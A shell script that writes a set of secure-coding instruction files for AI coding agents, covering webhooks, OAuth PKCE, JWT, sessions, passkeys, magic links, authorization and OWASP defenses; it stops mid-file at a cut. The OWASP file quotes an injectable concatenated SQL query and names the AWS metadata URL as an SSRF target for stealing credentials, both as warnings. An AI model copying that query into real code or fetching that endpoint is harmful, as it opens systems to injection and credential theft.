cat << 'EOF' > skills/api/webhooks/signature-verification-and-delivery/SKILL.md
---
name: "signature-verification-and-delivery"
description: "Implementing secure webhook receivers and dispatch engines with HMAC-SHA256 signature verification, replay attack prevention, and idempotent retry pipelines."
category: "api"
subcategory: "webhooks"
language: "agnostic"
framework: "none"
technology: "webhooks"
difficulty: "intermediate"
tags: ["api", "webhooks", "hmac-sha256", "security", "replay-attacks", "signature-verification"]
---

# Webhook Signature Verification and Resilient Delivery Engine

## Purpose
Provide AI agents with rigorous security and reliability patterns for both receiving external webhooks (Stripe, GitHub) and building outgoing webhook dispatch engines.

## When to Use
Use when ingesting third-party webhook events, designing webhook notification systems for SaaS platforms, or securing asynchronous callbacks.

## Inputs / Context
Webhook payload, secret signing key, signature header (e.g., `X-Signature`, `Stripe-Signature`), timestamp tolerance window.

## Instructions
1. RECEIVING WEBHOOKS:
   - Always verify the cryptographic signature using HMAC-SHA256 over the raw, unparsed request body string paired with the shared webhook secret.
   - Prevent Timing Attacks: always compare the computed signature against the header signature using constant-time comparison (`crypto.timingSafeEqual`).
   - Prevent Replay Attacks: require and verify a timestamp header (e.g., `t=1710000000`). Reject requests older than a tolerance window (e.g., 5 minutes / 300 seconds).
   - Ingest Immediately: upon signature verification, persist the event payload into a queue or database and return HTTP `200 OK` or `202 Accepted` within 200ms; execute actual business logic asynchronously in a background worker.
   - Enforce Idempotency: track received webhook event IDs to discard duplicate deliveries.
2. DISPATCHING WEBHOOKS:
   - Compute signature header: `t=TIMESTAMP,v1=HMAC_SHA256(secret, TIMESTAMP + "." + payload)`.
   - Implement exponential backoff retries with jitter for non-2xx responses or network timeouts over 24-72 hours.
   - Automatically disable or alert on webhook subscriptions that fail consistently for over 50 consecutive attempts.

## Constraints / Rules
- Never verify webhook signatures using parsed JSON objects (`req.body`); verification must run against the exact raw byte buffer received over the wire.
- Never use standard string equality (`===`) for signature verification; always use constant-time comparison.
- Do not perform slow synchronous business processing before returning HTTP 200 to the webhook provider.

## Workflow
1. Capture raw request body before JSON body-parser middleware executes.
2. Extract timestamp and signature components from header.
3. Verify timestamp is within 300-second window.
4. Calculate expected HMAC-SHA256 signature and verify with constant-time equality.
5. Deduplicate event ID and push to background processing queue.
6. Return HTTP 200 OK immediately.

## Expected Output
Secure webhook handler implementation with raw body parsing, timing-safe HMAC verification, replay defense, and async queue offloading.

## Validation Checklist
- [ ] Is signature verified against raw unparsed request bytes?
- [ ] Is constant-time equality (`timingSafeEqual`) used for comparison?
- [ ] Are timestamps validated to block replay attacks?
- [ ] Does the endpoint respond with 200 OK immediately before long-running tasks run?
- [ ] Are event IDs deduplicated to ensure idempotent processing?

## Common Mistakes & Antipatterns
- Parsing the request body with `JSON.parse()` and re-stringifying with `JSON.stringify()` before computing the HMAC; key order or whitespace differences break the signature.
- Using `signature === computedSignature`, exposing the endpoint to remote timing side-channel attacks.
- Processing heavy database migrations synchronously in the webhook controller, causing the webhook provider (e.g., Stripe) to timeout and repeatedly retry the webhook.

## Concrete Real-World Example
Scenario: A payment webhook handler crashes or times out because it re-stringifies JSON payloads to verify signatures and runs credit card provisioning synchronously.
Prompt: Refactor this Stripe webhook receiver to be secure, fast, and resilient against replay attacks.
Application: The AI captures `req.rawBody`, validates `t` timestamp against `Date.now()`, performs constant-time HMAC comparison, pushes the verified event to a BullMQ Redis queue, and immediately returns `{ received: true }` with status 200.
EOF

cat << 'EOF' > skills/authentication/oauth/pkce-authorization-flow/SKILL.md
---
name: "pkce-authorization-flow"
description: "Implementing secure OAuth 2.1 / OIDC Authorization Code Flow utilizing Proof Key for Code Exchange (PKCE), state verification, and token exchange."
category: "authentication"
subcategory: "oauth"
language: "typescript"
framework: "none"
technology: "oauth2-oidc"
difficulty: "advanced"
tags: ["authentication", "oauth2", "pkce", "oidc", "security", "authorization-code"]
---

# OAuth 2.1 Authorization Code Flow with PKCE

## Purpose
Provide concrete implementation rules for OAuth 2.0 / 2.1 Authorization Code Flow with PKCE, preventing authorization code interception and CSRF attacks across Single Page Apps, mobile apps, and backends.

## When to Use
Use when integrating third-party login (Google, GitHub, Auth0, Okta), building an identity provider, or authenticating SPAs and mobile applications.

## Inputs / Context
Client ID, authorization endpoint, token endpoint, redirect URI, requested scopes, and storage layer for session state.

## Instructions
1. Enforce OAuth 2.1 standards: always use Authorization Code Flow with PKCE (Proof Key for Code Exchange) for both public clients (SPA/mobile) and confidential clients (web servers); deprecate the OAuth 2.0 Implicit Flow.
2. PKCE Generation (Client-Side Initiation):
   - Generate a cryptographically random `code_verifier` string (43 to 128 characters from unreserved characters [A-Z, a-z, 0-9, '-', '.', '_', '~']).
   - Calculate the `code_challenge`: SHA-256 hash of the `code_verifier`, Base64URL-encoded (method: `S256`). Never use `plain`.
   - Generate a cryptographically random `state` parameter and a `nonce` to prevent Cross-Site Request Forgery (CSRF) and token replay.
   - Store `code_verifier`, `state`, and `nonce` in secure, temporary storage (e.g., HttpOnly cookie or encrypted session).
3. Authorization Request: Redirect user to authorization endpoint with: `response_type=code`, `client_id`, `redirect_uri`, `scope`, `state`, `code_challenge`, and `code_challenge_method=S256`.
4. Callback Validation:
   - Verify returned `state` parameter exactly matches the stored session `state`. If mismatched or missing, abort immediately (CSRF detected).
   - Extract authorization `code`.
5. Token Exchange:
   - Send POST request to token endpoint with: `grant_type=authorization_code`, `code`, `redirect_uri`, `client_id`, and the original plain `code_verifier`.
   - The authorization server hashes the received `code_verifier` and verifies it matches the previously submitted `code_challenge`.
6. Token Storage: Store returned refresh and access tokens in secure, HttpOnly, SameSite=Lax/Strict cookies; never store tokens in browser `localStorage` or `sessionStorage`.

## Constraints / Rules
- Never use the deprecated Implicit Flow (`response_type=token`).
- Never use `code_challenge_method=plain`; always enforce `S256`.
- Never store OAuth access or refresh tokens in `localStorage`, which is vulnerable to XSS theft.

## Workflow
1. Generate high-entropy `code_verifier` and `state` parameters.
2. Compute SHA-256 `code_challenge`.
3. Construct authorization URL and redirect client.
4. On redirect callback, validate `state` parameter.
5. POST to token endpoint with authorization code and `code_verifier`.
6. Set secure HttpOnly cookies with returned session tokens.

## Expected Output
Complete OAuth2 PKCE client flow with cryptographically secure parameter generation, state validation, and secure cookie session storage.

## Validation Checklist
- [ ] Is PKCE enforced using `code_challenge_method=S256`?
- [ ] Is `state` parameter generated with high entropy and verified on callback?
- [ ] Are tokens stored in secure, HttpOnly, SameSite cookies rather than localStorage?
- [ ] Is the deprecated Implicit Flow completely avoided?
- [ ] Are authorization codes exchanged only once and immediately invalidated?

## Common Mistakes & Antipatterns
- Storing JWT access tokens in `localStorage`, allowing any injected third-party script (XSS) to steal credentials.
- Omitting the `state` parameter, leaving users vulnerable to OAuth login CSRF attacks.
- Using `code_challenge_method=plain`, defeating the security benefits of PKCE.

## Concrete Real-World Example
Scenario: A React Single Page App implements Google Login by receiving access tokens directly in URL hash fragments (Implicit Flow) and storing them in localStorage.
Prompt: Modernize this OAuth login flow to use Authorization Code Flow with PKCE and secure backend session cookies.
Application: The AI creates a backend proxy endpoint that initiates PKCE, redirects to Google with an `S256` challenge, validates state on callback, exchanges the code and verifier server-side, and issues an encrypted HttpOnly session cookie to the SPA.
EOF

cat << 'EOF' > skills/authentication/jwt/token-rotation-and-validation/SKILL.md
---
name: "token-rotation-and-validation"
description: "Engineering secure JSON Web Token (JWT) lifecycles with asymmetric key signatures (RS256/EdDSA), short-lived access tokens, refresh token rotation, and revocation lists."
category: "authentication"
subcategory: "jwt"
language: "typescript"
framework: "none"
technology: "jwt"
difficulty: "advanced"
tags: ["authentication", "jwt", "tokens", "refresh-token-rotation", "rs256", "cryptography"]
---

# JWT Architecture, Token Rotation, and Cryptographic Validation

## Purpose
Instruct AI agents to implement secure JWT authentication systems that prevent algorithm confusion attacks, support instantaneous revocation, and rotate refresh tokens automatically.

## When to Use
Use when building distributed microservice authentication, mobile app authentication backends, or stateless API session layers.

## Inputs / Context
Key pairs (private/public), token expiration limits, claims schema, and token storage backend (Redis/DB).

## Instructions
1. Sign tokens using asymmetric algorithms (RS256 or EdDSA / Ed25519) so services can verify tokens using public keys without possessing the private signing key.
2. Guard against the 'none' algorithm and Algorithm Confusion attacks: explicitly specify the expected algorithm during verification (e.g., `algorithms: ['RS256']`); never trust the `alg` header from the client token.
3. Configure short token lifespans: Access Tokens must expire in 5-15 minutes; Refresh Tokens should expire in 7-30 days.
4. Implement Automatic Refresh Token Rotation:
   - When a refresh token is used, invalidate it immediately and issue a brand-new refresh token and access token pair.
   - Store refresh token family IDs in database/Redis.
   - Detect Token Theft / Reuse: If an already-used or invalidated refresh token is presented, immediately revoke the ENTIRE token family (all refresh tokens belonging to that user session), forcing re-authentication.
5. Validate all standard JWT claims: `exp` (expiration), `nbf` (not before), `iat` (issued at), `iss` (issuer), and `aud` (audience).
6. Store tokens securely: deliver tokens in `HttpOnly`, `Secure`, `SameSite=Strict` cookies.
7. Keep JWT payloads lightweight: include only essential identifiers (`sub`, `roles`); never put sensitive data (passwords, credit card info, PII) in unencrypted JWT claims.

## Constraints / Rules
- Never accept tokens signed with the `none` algorithm.
- Never use symmetric HS256 across distributed third-party services where public-key verification is needed.
- Do not store refresh tokens as raw plain text in the database; hash them with SHA-256 before storage.

## Workflow
1. Generate asymmetric RSA-4096 or Ed25519 key pair.
2. Issue short-lived access token and hashed refresh token with family identifier.
3. Verify access token signature, issuer, audience, and expiration on every request.
4. On refresh request, atomically rotate refresh token in database.
5. If token reuse is detected, revoke all tokens in the family and log a security alert.

## Expected Output
Secure JWT signing, verification, and refresh token rotation middleware with reuse detection and family revocation.

## Validation Checklist
- [ ] Are verification algorithms explicitly whitelisted (`algorithms: ['RS256']`)?
- [ ] Are access tokens short-lived (<= 15 minutes)?
- [ ] Is refresh token rotation implemented with automatic family revocation on reuse?
- [ ] Are refresh tokens stored as cryptographic hashes in the database?
- [ ] Are tokens delivered in HttpOnly, Secure, SameSite cookies?

## Common Mistakes & Antipatterns
- Allowing the JWT library to dynamically use the `alg` specified in the token header, enabling attackers to forge signatures using the public key as an HMAC secret.
- Setting access token expiration to 30 days with no revocation mechanism, leaving accounts compromised indefinitely if a token leaks.
- Putting confidential user data into the JWT payload, forgetting that JWT claims are merely Base64-encoded and readable by anyone.

## Concrete Real-World Example
Scenario: An attacker intercepts an old refresh token and attempts to generate new access tokens while the legitimate user is also active.
Prompt: Implement refresh token rotation with reuse detection in Node.js.
Application: The AI creates a database schema tracking `tokenFamilyId`, `isRevoked`, and `tokenHash`. When the attacker submits the consumed token, the server detects reuse, invalidates all sessions under `tokenFamilyId`, deletes the session cookie, and prompts the user to re-authenticate.
EOF

cat << 'EOF' > skills/authentication/sessions/secure-cookie-session-management/SKILL.md
---
name: "secure-cookie-session-management"
description: "Architecting secure, stateful server-side session management with Redis backends, cryptographically random session IDs, session fixation defense, and cookie flags."
category: "authentication"
subcategory: "sessions"
language: "typescript"
framework: "none"
technology: "session-auth"
difficulty: "intermediate"
tags: ["authentication", "sessions", "cookies", "security", "session-fixation", "redis"]
---

# Stateful Session Management and Secure Cookie Hygiene

## Purpose
Provide AI agents with concrete rules for implementing battle-tested stateful session management with strict cookie security flags and instantaneous revocation.

## When to Use
Use when building traditional web applications, administrative dashboards, or high-security services where immediate session revocation and defense-in-depth are paramount.

## Inputs / Context
Session store (Redis/Postgres), cookie configuration, session idle/absolute timeouts, and authentication routes.

## Instructions
1. Generate session IDs using a cryptographically secure pseudorandom number generator (CSPRNG) with at least 128 bits of entropy (e.g., `crypto.randomBytes(32).toString('hex')`).
2. Always configure all four essential cookie security flags:
   - `HttpOnly`: Prevents client-side scripts from reading the cookie via `document.cookie`, mitigating XSS token theft.
   - `Secure`: Ensures cookies are transmitted exclusively over encrypted HTTPS connections.
   - `SameSite=Lax` (or `SameSite=Strict` for high-security portals): Prevents cookies from being attached to cross-site requests, mitigating CSRF attacks.
   - `Domain` and `Path`: Scope cookies strictly to the application domain (`Path=/`).
3. Prevent Session Fixation attacks: always regenerate the session ID immediately upon any privilege change (login, logout, role escalation, password change).
4. Implement Dual Timeouts:
   - Idle Timeout: Expire session after N minutes of inactivity (e.g., 30 minutes).
   - Absolute Timeout: Force complete re-authentication after a maximum elapsed window (e.g., 12 hours) regardless of ongoing activity.
5. Support Global and Granular Session Revocation: Allow users to view all active sessions (IP address, user agent, last active) and terminate individual sessions or 'Log out of all devices'.
6. Protect against CSRF: pair session cookies with Synchronizer Token Pattern or Double Submit Cookie validation on all state-changing HTTP requests.

## Constraints / Rules
- Never retain the same session ID across authentication boundary transitions (login).
- Never set `HttpOnly: false` on session cookies.
- Do not store sensitive database objects in session cache; store only the minimal `userId` and authorization version.

## Workflow
1. Initialize session middleware with Redis backing store.
2. Configure cookie flags (`HttpOnly`, `Secure`, `SameSite=Lax`).
3. On successful login, regenerate session ID using `req.session.regenerate()`.
4. Validate idle and absolute timeouts on each incoming request.
5. Invalidate session in Redis and clear cookie on logout.

## Expected Output
Stateful session management implementation with secure cookie flags, Redis store integration, session fixation defense, and revocation endpoints.

## Validation Checklist
- [ ] Are `HttpOnly`, `Secure`, and `SameSite` flags enabled on cookies?
- [ ] Is session ID regenerated immediately upon login?
- [ ] Are both idle and absolute timeouts enforced?
- [ ] Can sessions be revoked immediately in Redis by user ID?
- [ ] Is session ID generated using CSPRNG with >= 128 bits of entropy?

## Common Mistakes & Antipatterns
- Forgetting to regenerate the session ID on login, allowing an attacker who set a known session cookie on a shared computer to hijack the user's logged-in session (Session Fixation).
- Omitting `SameSite` attribute, relying solely on custom headers for CSRF protection.
- Storing entire user records in the session store, leading to stale permissions when user roles are updated in the primary database.

## Concrete Real-World Example
Scenario: An online banking portal uses cookies without `HttpOnly` or `SameSite`, allowing cross-site malicious scripts to trigger fund transfers.
Prompt: Secure this Express session implementation for a financial dashboard.
Application: The AI configures `express-session` with `connect-redis`, sets `cookie: { secure: true, httpOnly: true, sameSite: 'strict', maxAge: 1800000 }`, enforces `req.session.regenerate()` upon login, and adds CSRF double-submit token validation.
EOF

cat << 'EOF' > skills/authentication/passkeys/webauthn-registration-and-login/SKILL.md
---
name: "webauthn-registration-and-login"
description: "Implementing phishing-resistant passwordless authentication using Passkeys, WebAuthn, FIDO2, public-key cryptography, and SimpleWebAuthn."
category: "authentication"
subcategory: "passkeys"
language: "typescript"
framework: "none"
technology: "webauthn-fido2"
difficulty: "advanced"
tags: ["authentication", "passkeys", "webauthn", "fido2", "passwordless", "cryptography"]
---

# Passkeys and WebAuthn / FIDO2 Passwordless Authentication

## Purpose
Instruct AI agents to implement phishing-resistant Passkey registration and authentication flows adhering strictly to W3C WebAuthn Level 3 specifications.

## When to Use
Use when implementing Passkeys, hardware security keys (YubiKey), Touch ID / Face ID biometric login, or multi-factor authentication (MFA).

## Inputs / Context
Relying Party (RP) configuration (ID, name, origin), user account model, credential database table, and WebAuthn library.

## Instructions
1. Understand WebAuthn architecture:
   - Relying Party (RP): The backend server application.
   - Client: The web browser or mobile OS supporting `navigator.credentials`.
   - Authenticator: The hardware security key, Touch ID, Face ID, or platform passkey provider.
2. Registration Ceremony (Create Credential):
   - Server generates registration options: cryptographically random `challenge` (saved in session with 60s TTL), `rp` (name and `id` matching domain origin), `user` (id, name, displayName), and allowed `pubKeyCredParams` (e.g., -7 for ES256, -257 for RS256).
   - Browser calls `navigator.credentials.create({ publicKey: options })`.
   - Server receives `attestationResponse`: verifies `challenge` matches session, verifies `origin` matches server domain, extracts and stores `credentialID`, `credentialPublicKey`, and `counter` (initialized to 0) in the user credentials database.
3. Authentication Ceremony (Get Assertion):
   - Server generates authentication options: cryptographically random `challenge`, matching `rpId`, and list of user's registered `allowCredentials` IDs.
   - Browser calls `navigator.credentials.get({ publicKey: options })`.
   - Server receives `assertionResponse`: verifies `challenge`, verifies `origin`, verifies signature using stored `credentialPublicKey`.
   - Replay and Clone Detection: verify the returned `counter` is strictly greater than the stored `counter`; if `counter <= storedCounter` (and counter > 0), alert possible cloned authenticator and reject authentication.
4. Update stored `counter` with the newly received counter value upon successful verification.
5. Issue application session upon successful assertion.

## Constraints / Rules
- Never verify WebAuthn responses on the client side; cryptographic verification must occur on the server.
- Never hardcode `rpID` or `origin`; validate strictly against the host domain.
- Do not ignore the signature counter check, as it provides clone detection for hardware tokens.

## Workflow
1. Configure Relying Party identity and origins.
2. Implement `/auth/passkey/register-options` and `/auth/passkey/register-verify`.
3. Implement `/auth/passkey/login-options` and `/auth/passkey/login-verify`.
4. Store credential ID, public key bytes, and signature counter in database.
5. Create accessible UI with fallback for browsers without WebAuthn support.

## Expected Output
Complete WebAuthn Level 3 Passkey registration and login endpoints with challenge generation, signature verification, and counter validation.

## Validation Checklist
- [ ] Are challenges generated with CSPRNG and stored temporarily in session?
- [ ] Is origin strictly verified against expected HTTPS domain?
- [ ] Is signature counter validated to detect cloned authenticators?
- [ ] Are public keys stored safely in binary/base64url format?
- [ ] Is the ceremony phishing-resistant (bound to RP ID)?

## Common Mistakes & Antipatterns
- Accepting arbitrary `origin` headers without validation, completely nullifying WebAuthn's built-in phishing protection.
- Failing to verify that the returned challenge matches the challenge issued in the initial registration/login step.
- Failing to increment and check the signature counter, missing clone attacks on physical security keys.

## Concrete Real-World Example
Scenario: A web application wants to eliminate passwords by enabling Apple Touch ID and Windows Hello Passkey logins.
Prompt: Implement Passkey registration and login using SimpleWebAuthn in a TypeScript backend.
Application: The AI creates `generateRegistrationOptions` saving a base64url challenge in Redis, validates the browser's attestation response with `verifyRegistrationResponse`, stores the credential in PostgreSQL, and verifies subsequent login assertions with clone-detection counter tracking.
EOF

cat << 'EOF' > skills/authentication/magic-links/passwordless-email-verification/SKILL.md
---
name: "passwordless-email-verification"
description: "Designing secure passwordless magic link authentication with cryptographic token hashing, single-use enforcement, anti-scanner confirmation, and short TTLs."
category: "authentication"
subcategory: "magic-links"
language: "typescript"
framework: "none"
technology: "magic-links"
difficulty: "intermediate"
tags: ["authentication", "magic-links", "passwordless", "email", "security", "tokens"]
---

# Passwordless Magic Link Authentication and Email Verification

## Purpose
Guide AI in implementing secure, passwordless email login flows that prevent token leakage, protect against email spam scanners, and ensure single-use token consumption.

## When to Use
Use when implementing passwordless authentication, email address verification, or account recovery via email.

## Inputs / Context
Email delivery service, token persistence store, rate limiter, and frontend callback routes.

## Instructions
1. Generate high-entropy, cryptographically secure tokens: create a 32-byte random token (`crypto.randomBytes(32).toString('hex')`).
2. Hash Before Storage: NEVER store the raw token in the database. Compute the SHA-256 hash of the token (`crypto.createHash('sha256').update(rawToken).digest('hex')`) and store only the hash with the associated user ID and expiration timestamp.
3. Enforce Short Lifespans: Magic link tokens must expire in 10 to 15 minutes.
4. Enforce Single-Use Consumption:
   - When the user clicks the link, hash the incoming token and look up the record.
   - Atomically delete or mark the token as used in a single database transaction (`DELETE FROM magic_tokens WHERE token_hash = ? RETURNING user_id`).
   - If no record was updated/returned, reject immediately (token invalid or already consumed).
5. Defend Against Automated Email Security Scanners (Enterprise Firewalls):
   - Corporate spam filters (e.g., Proofpoint, Mimecast) crawl and click all links in incoming emails automatically, which prematurely consumes single-use tokens.
   - Defense: Do NOT consume the token or log the user in on HTTP `GET /auth/verify?token=...`.
   - Instead, render a clean landing page with a 'Click here to sign in' confirmation button that triggers an HTTP `POST` to consume the token.
6. Rate Limit Magic Link Requests: Enforce aggressive rate limits per email address (e.g., max 3 requests per 15 minutes) and per IP address to prevent email flooding and resource exhaustion.
7. Prevent User Enumeration: Always return a generic success message ('If an account exists with this email, a sign-in link has been sent') regardless of whether the email was found in the database.

## Constraints / Rules
- Never store plaintext magic link tokens in the database.
- Never log the user in directly via an unconfirmed `GET` request.
- Do not allow tokens to be reused under any circumstances.

## Workflow
1. Client submits email address.
2. Check rate limit for target email.
3. Generate 32-byte random token, hash with SHA-256, and store hash with 15-minute TTL.
4. Send email containing link with raw token.
5. User clicks link to landing page and clicks confirmation button.
6. POST request atomically consumes token and issues session cookie.

## Expected Output
Secure magic link generation and verification service with SHA-256 hashing, anti-scanner confirmation page, and atomic single-use consumption.

## Validation Checklist
- [ ] Are tokens hashed with SHA-256 before database storage?
- [ ] Is token expiration capped at <= 15 minutes?
- [ ] Is token consumption executed atomically in a single transaction?
- [ ] Is automated email scanner pre-fetching prevented via POST confirmation?
- [ ] Are email responses sanitized to prevent account enumeration?

## Common Mistakes & Antipatterns
- Storing magic tokens in plain text, allowing any database reader or read-replica leak to compromise every user account.
- Consuming the token on HTTP `GET`, causing corporate antivirus scanners to invalidate links before users even open their email.
- Revealing whether an email is registered ('User not found' vs 'Email sent'), facilitating user enumeration attacks.

## Concrete Real-World Example
Scenario: Enterprise users report that magic links are always reported as 'Invalid or already expired' the moment they receive them in Microsoft Outlook.
Prompt: Fix this magic link expiration bug caused by enterprise email security scanners.
Application: The AI converts the verification endpoint from a `GET` auto-login into a landing page with a CSRF-protected `POST /verify` form, preventing Outlook's automated URL crawler from consuming the one-time token.
EOF

cat << 'EOF' > skills/authentication/permissions/rbac-and-abac-policy-engine/SKILL.md
---
name: "rbac-and-abac-policy-engine"
description: "Architecting hybrid authorization engines combining Role-Based Access Control (RBAC) with Attribute-Based Access Control (ABAC) for fine-grained resource permissions."
category: "authentication"
subcategory: "permissions"
language: "typescript"
framework: "none"
technology: "authorization-engine"
difficulty: "advanced"
tags: ["authentication", "authorization", "rbac", "abac", "permissions", "policy-engine"]
---

# Role-Based (RBAC) and Attribute-Based (ABAC) Access Control

## Purpose
Instruct AI agents to build scalable, granular authorization policy engines capable of evaluating user roles, organizational hierarchies, and contextual resource attributes.

## When to Use
Use when implementing authorization in SaaS platforms, multi-tenant systems, enterprise dashboards, or document collaboration tools.

## Inputs / Context
Actor (user, roles, attributes), Action (read, write, delete, share), Resource (document, project, ownerId, status), and Environment Context (time, IP, department).

## Instructions
1. Differentiate authorization models:
   - RBAC (Role-Based): Evaluates coarse roles (e.g., `Admin`, `Editor`, `Viewer`) mapped to permissions (e.g., `documents:create`, `documents:delete`).
   - ABAC (Attribute-Based): Evaluates granular attributes of Actor, Action, Resource, and Environment (e.g., 'User can edit document IF user is in the same department AND document status is draft').
2. Structure permissions using standard namespacing: `resource:action` (e.g., `projects:create`, `invoices:export`, `users:invite`).
3. Implement a unified Policy Engine function: `can(actor, action, resource, context?): boolean`.
4. Separate Policy Definitions from business logic code: define policies declaratively in isolated policy rule matrices or classes (e.g., CASL or custom policy classes).
5. Always evaluate permissions on the backend API layer regardless of what UI controls are rendered or disabled on the frontend.
6. Return HTTP `403 Forbidden` when an authenticated user lacks permission for a known resource; return HTTP `404 Not Found` if revealing the existence of the resource is itself a security violation.
7. Optimize multi-resource checks in database queries: push authorization predicates directly into database query `WHERE` clauses rather than fetching 1,000 rows into memory and filtering with `can()`.

## Constraints / Rules
- Never rely on client-side permission checks for security; client-side checks are purely for UI/UX convenience.
- Never hardcode role checks (`if (user.role === 'admin')`) directly inside controller routes; check permissions (`if (can(user, 'update', document))`).
- Avoid loading unbounded resource lists into application memory to filter by permission.

## Workflow
1. Define atomic permission strings and default role-permission mappings.
2. Build declarative policy rules for each domain resource.
3. Implement authorization middleware for route endpoints.
4. Translate policy rules into database SQL/ORM query filters for list endpoints.
5. Author exhaustive unit tests for every role and attribute permutation.

## Expected Output
Clean TypeScript policy engine supporting RBAC roles, ABAC dynamic attribute evaluations, route middleware, and database query filters.

## Validation Checklist
- [ ] Are permissions checked using action strings (`resource:action`) rather than raw role names?
- [ ] Are ABAC attributes (ownership, tenant, department) evaluated dynamically?
- [ ] Are list queries filtered at the database level rather than in-memory?
- [ ] Are unauthorized mutations rejected with HTTP 403 or 404?
- [ ] Are all policy combinations covered by unit tests?

## Common Mistakes & Antipatterns
- Hardcoding `if (user.role === 'superadmin')` across 50 controllers, making it impossible to add a custom 'compliance_officer' role later without rewriting every route.
- Fetching 10,000 documents from the database and running an in-memory `.filter(doc => can(user, 'read', doc))` loop, causing severe latency and memory spikes.
- Failing to verify tenant/organization isolation in attribute checks, allowing cross-tenant privilege escalation.

## Concrete Real-World Example
Scenario: A project management app allows any user with the 'Editor' role to edit ANY project in the system, even projects belonging to competing client organizations.
Prompt: Refactor this authorization system to enforce both RBAC permissions and organization/ownership ABAC boundaries.
Application: The AI builds a policy engine verifying `actor.hasPermission('project:update')` AND `actor.orgId === project.orgId` AND (`project.isPublic || project.members.includes(actor.id)`), eliminating cross-organization data tampering.
EOF

cat << 'EOF' > skills/security/secure-coding/owasp-top-10-prevention/SKILL.md
---
name: "owasp-top-10-prevention"
description: "Systematic defensive engineering patterns to eliminate the OWASP Top 10 vulnerabilities: Injection, Broken Auth, SSRF, XSS, and Security Misconfiguration."
category: "security"
subcategory: "secure-coding"
language: "agnostic"
framework: "none"
technology: "owasp-security"
difficulty: "advanced"
tags: ["security", "owasp", "sql-injection", "xss", "ssrf", "secure-coding", "defense-in-depth"]
---

# OWASP Top 10 Defensive Engineering and Secure Coding

## Purpose
Equip AI agents with definitive secure coding principles to proactively eliminate common software vulnerabilities during code synthesis and code review.

## When to Use
Use during all software development activities, code reviews, API endpoint construction, and security vulnerability audits.

## Inputs / Context
Source code, data inputs, external communication calls, configuration parameters, and template rendering logic.

## Instructions
1. Injection Defense:
   - SQL Injection: ALWAYS use parameterized queries or type-safe ORM query builders. Never concatenate user strings into raw SQL statements.
   - Command Injection: Avoid invoking OS shells (`exec`, `system`). If unavoidable, use spawn with fixed argument arrays (`execFile`, `spawn`) without shell interpolation (`shell: false`).
2. Cross-Site Scripting (XSS) Defense:
   - Rely on context-aware automatic escaping engines (React JSX, modern template engines).
   - Never use `dangerouslySetInnerHTML`, `v-html`, or `innerHTML` with untrusted data without sanitizing through DOMPurify.
   - Set a strict Content Security Policy (CSP) header: `default-src 'self'; script-src 'self'; object-src 'none';`.
3. Server-Side Request Forgery (SSRF) Defense:
   - When fetching user-supplied URLs, never fetch private IP ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.169.254` AWS metadata).
   - Validate URLs against strict protocol whitelists (`http:`, `https:` only) and resolve DNS to verify the target IP is public before connecting.
4. Security Misconfiguration Defense:
   - Disable debug modes, directory browsing, and default credentials in production.
   - Remove verbose server headers (`X-Powered-By`, `Server`).
   - Configure security headers using Helmet: `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`.

## Constraints / Rules
- Never concatenate user strings into database queries or shell command strings.
- Never fetch user-provided URLs without validating against private/loopback IP address ranges.
- Do not disable SSL/TLS certificate verification (`rejectUnauthorized: false` is strictly forbidden).

## Workflow
1. Audit all data input boundaries (query params, body, headers, files).
2. Apply parameterization and type enforcement.
3. Configure security response headers.
4. Block internal network access on outbound URL fetches.
5. Verify with automated static security analysis (SAST).

## Expected Output
Hardened application code featuring parameterized queries, safe subprocess execution, SSRF protections, and strict security headers.

## Validation Checklist
- [ ] Are all database queries parameterized with zero string concatenation?
- [ ] Is unescaped HTML rendering prohibited or sanitized via DOMPurify?
- [ ] Are outbound HTTP requests protected against internal IP SSRF?
- [ ] Are standard security headers (HSTS, CSP, X-Frame-Options) configured?
- [ ] Is shell command execution eliminated or secured with argument vectors?

## Common Mistakes & Antipatterns
- Concatenating query parameters: `db.query("SELECT * FROM users WHERE email = '" + req.body.email + "'")`, opening a trivial SQL injection flaw.
- Allowing users to specify a webhook URL and fetching it directly, enabling attackers to query `http://169.254.169.254/latest/meta-data/` and steal AWS IAM instance credentials.
- Rendering untrusted user input using `dangerouslySetInnerHTML`, permitting stored XSS attacks.

## Concrete Real-World Example
Scenario: An image proxy endpoint takes a `url` parameter and fetches it to resize it, allowing internal network port scanning and AWS metadata credential theft.
Prompt: Harden this image fetcher route against SSRF attacks and DNS rebinding.
Application: The AI resolves the DNS hostname before connecting, verifies the IP does not match private or link-local ranges (`169.254.0.0/16`, `127.0.0.0/8`), pins the resolved IP for the HTTP request to prevent DNS rebinding, and disables redirect following.
EOF

cat << 'EOF' > skills/security/authentication/credential-brute-force-protection/SKILL.md
---
name: "credential-brute-force-protection"
description: "Hardening authentication endpoints against credential stuffing and brute-force attacks using Argon2id password hashing, progressive delays, account lockouts, and CAPTCHA gates."
category: "security"
subcategory: "authentication"
language: "agnostic"
framework: "none"
technology: "auth-security"
difficulty: "advanced"
tags: ["security", "passwords", "argon2id", "brute-force", "credential-stuffing", "rate-limiting"]
---

# Credential Brute-Force Defense, Lockouts, and Argon2id Hashing

## Purpose
Provide concrete security standards for storing user credentials safely and protecting login endpoints from credential stuffing, dictionary attacks, and automated brute-forcing.

## When to Use
Use when implementing user password registration, login verification, password reset endpoints, or account security settings.

## Inputs / Context
User credentials, login endpoint, IP address, user-agent, and failed attempt counters.

## Instructions
1. Password Storage Standard:
   - Use Argon2id (OWASP recommended winner of the Password Hashing Competition) with minimum memory: 64MB (65536 KiB), iterations: 3, parallelism: 4.
   - If Argon2id is unsupported, use bcrypt with a work factor cost of at least 12.
   - Never use outdated, fast hash algorithms (MD5, SHA-1, SHA-256, SHA-512) for passwords.
2. Defend Against Timing Attacks:
   - When a login attempt specifies an unrecognized username/email, execute a dummy password hash computation (using a precomputed fixed hash) so that response time is identical to an authentic user lookup, preventing user enumeration via timing analysis.
3. Multi-Layered Brute-Force Rate Limiting:
   - IP-level rate limiting: max 10 failed attempts per IP per minute across all accounts.
   - Account-level rate limiting: max 5 failed attempts per specific username/email per 15 minutes.
4. Progressive Delays and Challenges:
   - After 3 consecutive failed attempts on an account, require a CAPTCHA (e.g., Cloudflare Turnstile).
   - After 5 consecutive failed attempts, lock the account for 15-30 minutes and dispatch an email alert to the account owner with an immediate unlock link.
5. Check against Compromised Password Databases:
   - During registration and password change, check password against HaveIBeenPwned via k-Anonymity API (sending only the first 5 characters of SHA-1 hash).

